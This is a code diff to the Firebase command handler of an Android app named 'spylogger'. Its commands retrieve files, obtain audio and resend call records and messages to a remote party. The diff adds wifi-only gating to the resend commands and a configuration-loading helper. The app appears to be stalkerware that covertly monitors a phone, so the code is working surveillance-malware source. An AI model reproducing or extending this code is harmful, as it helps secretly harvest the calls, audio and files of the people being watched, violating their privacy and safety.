@@ -5,6 +5,7 @@ import android.os.Message;
 import android.util.Log;
 
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
+import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.helpers.ServicosHelper;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
@@ -72,11 +73,14 @@ public class FcmHelperService {
             }
         };
 
+        Configuracao configuracao = null;
+
         switch (fcmMessageVO.getTipoAcao()) {
             case RECUPERAR_ARQUIVO:
                 enviarArquivo(recuperarArquivo());
                 break;
             case ESTA_ATIVO:
+                envioArquivoVO.setWifi(NetworkUtil.isWifi(context));
                 sendArquivoService.enviarAtivo(envioArquivoVO);
                 break;
             case OBTER_AUDIO:
@@ -113,29 +117,62 @@ public class FcmHelperService {
                 limparMensagens();
                 break;
             case REENVIAR_ARQUIVOS:
-                SendSolicitacoesArquivos sendSolicitacoesArquivos=new SendSolicitacoesArquivos(new TaskComplete() {
-                    @Override
-                    public void onFinish(Object object) {
-                        if(object!=null){
-                            Message msg= (Message) object;
-                            if(msg.what==200) {
-                                List<Integer> ids = (List<Integer>) msg.obj;
-                                reenviarArquivos(ids);
+
+                configuracao = getConfiguracao();
+                if (configuracao != null) {
+                    if(configuracao.isWifi() && !NetworkUtil.isWifi(context)){
+                        return;
+                    }
+
+                    SendSolicitacoesArquivos sendSolicitacoesArquivos = new SendSolicitacoesArquivos(new TaskComplete() {
+                        @Override
+                        public void onFinish(Object object) {
+                            if (object != null) {
+                                Message msg = (Message) object;
+                                if (msg.what == 200) {
+                                    List<Integer> ids = (List<Integer>) msg.obj;
+                                    reenviarArquivos(ids);
+                                }
                             }
                         }
-                    }
-                });
-                sendSolicitacoesArquivos.enviar(envioArquivoVO);
+                    });
+                    sendSolicitacoesArquivos.enviar(envioArquivoVO);
+                }
                 break;
             case REENVIAR_LIGACOES:
-                reenviarLigacoes(false);
+
+                configuracao = getConfiguracao();
+                if (configuracao != null) {
+                    if(configuracao.isWifi() && !NetworkUtil.isWifi(context)){
+                        return;
+                    }
+                    reenviarLigacoes(false);
+                }
                 break;
             case LIMPAR_REENVIAR_LIGACOES:
-                reenviarLigacoes(true);
+                configuracao = getConfiguracao();
+                if (configuracao != null) {
+                    if (configuracao.isWifi() && !NetworkUtil.isWifi(context)) {
+                        return;
+                    }
+                    reenviarLigacoes(true);
+                }
                 break;
             default:
                 return;
         }
+    }
+
+    private Configuracao getConfiguracao(){
+        try {
+            RepositorioConfiguracao repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);
+
+            return repositorioConfiguracao.getConfiguracao();
+
+        }catch (SQLException e){
+            Log.e(getClass().getSimpleName(),e.getMessage());
+        }
+        return null;
     }
 
     private void limparMensagens() {
